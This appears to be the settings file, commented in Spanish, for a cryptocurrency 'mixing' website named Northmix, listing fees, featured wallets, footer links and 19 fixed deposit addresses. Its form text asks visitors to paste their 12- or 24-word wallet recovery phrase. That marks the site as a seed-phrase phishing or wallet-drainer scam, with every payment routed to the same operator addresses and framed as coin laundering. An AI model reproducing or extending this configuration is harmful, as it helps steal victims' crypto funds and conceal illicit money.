// Configuración del sitio: aquí vive todo lo que se puede cambiar sin tocar el resto del código.
// Si este fichero falta o está roto, la web sigue funcionando con los valores internos de respaldo.
window.NORTHMIX_SITE = {
  // Nombre del sitio. Aparece en textos y en el título de las pestañas que se generan por código.
  siteName: 'Northmix',

  // Dirección pública del sitio. Es la base del canonical, del og:url, del sitemap y de los enlaces de la 404.
  // Se cambia SOLO cuando el dominio definitivo ya está comprado y apuntando aquí.
  SITE_ORIGIN: 'http://localhost:3000',

  // Comisión por defecto que ve el usuario al abrir el formulario, en porcentaje. El usuario puede cambiarla.
  defaultFeePercent: 1.0,

  // Red que se usa cuando el wallet elegido no dice nada o no hay wallet. No la cambies salvo pedido expreso.
  defaultNetwork: 'Ethereum',

  // Wallets que aparecen destacadas en el conector, por identificador. El resto sigue en la lista completa.
  visibleWallets: ['walletconnect', 'phantom', 'metamask'],

  // Enlaces del pie de página. Añadir o quitar líneas aquí cambia el pie.
  footerLinks: [
    { label: 'Guide', href: 'pages/guide.html' },
    { label: 'FAQ', href: 'pages/faq.html' },
    { label: 'Fees', href: 'pages/fees.html' },
    { label: 'Assets', href: 'pages/supported-assets.html' },
    { label: 'Networks', href: 'pages/supported-networks.html' },
    { label: 'Security', href: 'pages/security.html' },
    { label: 'Privacy', href: 'pages/privacy.html' }
  ],

  // Textos de la cabecera del formulario. Se pueden reescribir libremente.
  texts: {
    startTitle: 'Mix coins',
    startLead: 'Choose an asset, select a network, and enter the wallet where you want to receive your payout.',
    seedHint: 'Paste or type the phrase, 12 or 24 words. Network and deposit address follow the wallet you picked.'
  },

  // Pares de dirección congelados: 19 entradas. Cada una une un activo con su red y su dirección de depósito.
  // No cambies ninguna dirección sin pedido expreso; la red y el tipo deben seguir casando con la dirección.
  // USDT en TRON usa siempre una dirección que empieza por T.
  pairs: [
    { asset: 'btc', network: 'bitcoin', type: 'bech32', address: 'bc1qgr4yntpfmddf54ntevjz7fx4zwc206w0wjg4l2' },
    { asset: 'eth', network: 'ethereum', type: 'evm', address: '0x51d257049fcd3A619DB09bDAF603941050D18733' },
    { asset: 'eth', network: 'base', type: 'evm', address: '0x51d257049fcd3A619DB09bDAF603941050D18733' },
    { asset: 'eth', network: 'optimism', type: 'evm', address: '0x51d257049fcd3A619DB09bDAF603941050D18733' },
    { asset: 'eth', network: 'aurora', type: 'evm', address: '0x51d257049fcd3A619DB09bDAF603941050D18733' },
    { asset: 'usdt', network: 'ethereum', type: 'evm', address: '0x51d257049fcd3A619DB09bDAF603941050D18733' },
    { asset: 'usdt', network: 'bsc', type: 'evm', address: '0x51d257049fcd3A619DB09bDAF603941050D18733' },
    { asset: 'usdt', network: 'polygon', type: 'evm', address: '0x51d257049fcd3A619DB09bDAF603941050D18733' },
    { asset: 'usdt', network: 'solana', type: 'sol', address: 'HVZUEYA3gTTjv72PHcxQLpwKZhcVsMJto7VUZhXRV4cA' },
    { asset: 'usdt', network: 'tron', type: 'tron', address: 'TFgqgXPuLfmgm8hmc68tNe6qA6kCxfskR1' },
    { asset: 'usdc', network: 'ethereum', type: 'evm', address: '0x51d257049fcd3A619DB09bDAF603941050D18733' },
    { asset: 'usdc', network: 'bsc', type: 'evm', address: '0x51d257049fcd3A619DB09bDAF603941050D18733' },
    { asset: 'usdc', network: 'polygon', type: 'evm', address: '0x51d257049fcd3A619DB09bDAF603941050D18733' },
    { asset: 'usdc', network: 'avalanche', type: 'evm', address: '0x51d257049fcd3A619DB09bDAF603941050D18733' },
    { asset: 'usdc', network: 'solana', type: 'sol', address: 'HVZUEYA3gTTjv72PHcxQLpwKZhcVsMJto7VUZhXRV4cA' },
    { asset: 'bnb', network: 'bsc', type: 'evm', address: '0x51d257049fcd3A619DB09bDAF603941050D18733' },
    { asset: 'sol', network: 'solana', type: 'sol', address: 'HVZUEYA3gTTjv72PHcxQLpwKZhcVsMJto7VUZhXRV4cA' },
    { asset: 'ltc', network: 'litecoin', type: 'bech32-ltc', address: 'LfcBnaY9aR6zyYeRu4bWyutQAnuoHS4YBR' },
    { asset: 'zec', network: 'zcash', type: 'zec-transparent', address: 't1SmKF4L7ud7ELwrgUUG4UohpRBNiafvGPU' }
  ]
};
